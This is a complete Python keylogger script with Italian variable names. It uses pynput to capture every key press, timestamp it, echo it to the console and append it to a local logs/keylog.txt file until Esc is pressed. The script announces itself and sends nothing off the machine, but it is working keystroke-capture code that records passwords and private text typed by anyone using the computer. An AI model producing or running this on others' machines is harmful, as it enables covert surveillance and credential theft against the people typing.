from pynput import keyboard
from datetime import datetime
import os

CARTELLA_LOG = "logs"
PERCORSO_FILE = os.path.join(CARTELLA_LOG, "keylog.txt")

os.makedirs(CARTELLA_LOG, exist_ok=True)


def alla_pressione(tasto):
    TIMESTAMP = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        CARATTERE = tasto.char
    except AttributeError:
        CARATTERE = f"[{tasto.name.upper()}]"

    RIGA = f"[{TIMESTAMP}] {CARATTERE}\n"

    print(RIGA, end="")

    with open(PERCORSO_FILE, "a", encoding="utf-8") as FILE:
        FILE.write(RIGA)

    if tasto == keyboard.Key.esc:
        print("\nKeylogger fermato.")
        return False


if __name__ == "__main__":
    print(f"Keylogger avviato. Log in: {PERCORSO_FILE}")
    print("Premi esc per fermare.\n")

    with keyboard.Listener(on_press=alla_pressione) as LISTENER:
        LISTENER.join()